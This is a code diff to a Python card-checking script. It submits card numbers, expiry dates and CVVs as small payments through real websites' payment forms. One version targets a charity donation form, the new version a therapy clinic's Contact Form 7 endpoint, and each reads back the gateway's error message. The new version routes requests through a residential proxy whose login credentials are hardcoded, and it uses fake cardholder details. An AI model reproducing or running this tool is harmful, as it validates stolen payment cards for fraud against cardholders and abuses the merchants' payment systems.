@@ -1,6 +1,10 @@
 import requests,re
 import random
+from proxy import reqproxy, make_request
 def Tele(ccx):
+	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
+	session, ip = reqproxy(proxy_str)
+	#print(f"IP Address: {ip}")
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -17,107 +21,50 @@ def Tele(ccx):
 	random_amount1 = random.randint(1, 9)
 	random_amount2 = random.randint(1, 99)
 	
-	cookies = {
-	    'PHPSESSID': '66a434c0ca73e4ac69620aa767',
-	    '_ga': 'GA1.1.288837039.1753186515',
-	    '_ga_BDM6QESGE2': 'GS2.1.s1753186514$o1$g0$t1753186515$j59$l0$h0',
-	}
-	
 	headers = {
-	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'Cache-Control': 'max-age=0',
-	    'Connection': 'keep-alive',
-	    'Referer': 'https://www.google.com/',
-	    'Sec-Fetch-Dest': 'document',
-	    'Sec-Fetch-Mode': 'navigate',
-	    'Sec-Fetch-Site': 'cross-site',
-	    'Sec-Fetch-User': '?1',
-	    'Upgrade-Insecure-Requests': '1',
-	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'authority': 'www.choicetherapy1.com',
+	    'accept': 'application/json, */*;q=0.1',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'origin': 'https://www.choicetherapy1.com',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	params = {
-	    'src': 'forms',
-	    'ref': 'Donate to Anachnu',
+	files = {
+	    '_wpcf7': (None, '21949'),
+	    '_wpcf7_version': (None, '5.9.3'),
+	    '_wpcf7_locale': (None, 'en_US'),
+	    '_wpcf7_unit_tag': (None, 'wpcf7-f21949-p7884-o1'),
+	    '_wpcf7_container_post': (None, '7884'),
+	    '_wpcf7_posted_data_hash': (None, '61a3669ea5448a752b55a8134a57fa46'),
+	    'customer_first_name': (None, 'Rodam'),
+	    'customer_last_name': (None, 'User'),
+	    'patient_name': (None, ''),
+	    'payment_amount': (None, '1'),
+	    'email_address': (None, 'rodamuser08@gmail.com'),
+	    'invoice_number': (None, ''),
+	    'service_address': (None, 'No.236, 29th St'),
+	    'service_city': (None, 'Pabedan'),
+	    'service_state': (None, 'Yangon'),
+	    'service_zipcode': (None, '11181'),
+	    'authorize[cardholdername]': (None, 'Rodam User'),
+	    'authorize[card_number]': (None, f'{n}'),
+	    'authorize[exp_month]': (None, f'{mm}'),
+	    'authorize[exp_year]': (None, f'20{yy}'),
+	    'authorize[cvv_number]': (None, f'{cvc}'),
 	}
 	
-	response = requests.get('https://www.ujajcc.org/index.php', params=params, cookies=cookies, headers=headers)
+	response = session.post(
+	    'https://www.choicetherapy1.com/wp-json/contact-form-7/v1/contact-forms/21949/feedback',
+	    headers=headers,
+	    files=files,
+	)
 	
-	hash = re.search(r'name="hash" value="(.*?)"', response.text).group(1)
-	tok = re.search(r'name="csrfToken" value="(.*?)"', response.text).group(1)
-	
-	cookies = {
-	    'PHPSESSID': '66a434c0ca73e4ac69620aa767',
-	    '_ga': 'GA1.1.288837039.1753186515',
-	    '_ga_BDM6QESGE2': 'GS2.1.s1753186514$o1$g0$t1753186515$j59$l0$h0',
-	}
-	
-	headers = {
-	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'Cache-Control': 'max-age=0',
-	    'Connection': 'keep-alive',
-	    'Content-Type': 'application/x-www-form-urlencoded',
-	    # 'Cookie': 'PHPSESSID=66a434c0ca73e4ac69620aa767; _ga=GA1.1.288837039.1753186515; _ga_BDM6QESGE2=GS2.1.s1753186514$o1$g0$t1753186515$j59$l0$h0',
-	    'Origin': 'https://www.ujajcc.org',
-	    'Referer': 'https://www.ujajcc.org/index.php?src=forms&ref=Donate%20to%20Anachnu',
-	    'Sec-Fetch-Dest': 'document',
-	    'Sec-Fetch-Mode': 'navigate',
-	    'Sec-Fetch-Site': 'same-origin',
-	    'Sec-Fetch-User': '?1',
-	    'Upgrade-Insecure-Requests': '1',
-	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	}
-	
-	params = {
-	    'formProcessed': 'Donate to Anachnu',
-	}
-	
-	data = {
-	    'formField_donation_campaign': '',
-	    'formField_Name': 'Rodam User',
-	    'formField_payment1': '0',
-	    'formField_payment2': '1',
-	    'formPayment_total_payment': '1',
-	    'formField_DonateMonthly': '',
-	    'formField_Comment': '',
-	    'formPayment_method': 'Credit Card',
-	    'formPayment_card': f'{card_type}',
-	    'formPayment_owner': 'Rodam User',
-	    'formPayment_number': f'{n}',
-	    'formPayment_cvv': f'{cvc}',
-	    'formMeta_formPayment_expiration': 'expiration',
-	    'formPayment_expiration[]': [
-	        f'{mm}',
-	        f'20{yy}',
-	    ],
-	    'formField_Address': 'Street 27',
-	    'formField_City': 'New York',
-	    'formField_State': 'New York',
-	    'formField_Zip': '10014',
-	    'formField_Email': 'genpaypal02@gmail.com',
-	    'formPayment_gateway': '',
-	    'formPayment_description': 'Donation',
-	    'formmodule': 'forms',
-	    'hash': f'{hash}',
-	    'csrfToken': f'{tok}',
-	    'edit_id': '0',
-	    'module': '',
-	    'src': 'forms',
-	    'srctype': 'process',
-	    'id': 'Donate%20to%20Anachnu',
-	    'fs_id': 'Donate%20to%20Anachnu',
-	}
-	
-	response = requests.post('https://www.ujajcc.org/index.php', params=params, cookies=cookies, headers=headers, data=data)
-	
-	result = re.search(r'<b>Payment error:<\/b> (.*?)<\/div>', response.text).group(1)
+	result = re.search(r'"message":"(.*?)"', response.text).group(1)
 		
 	return (result)
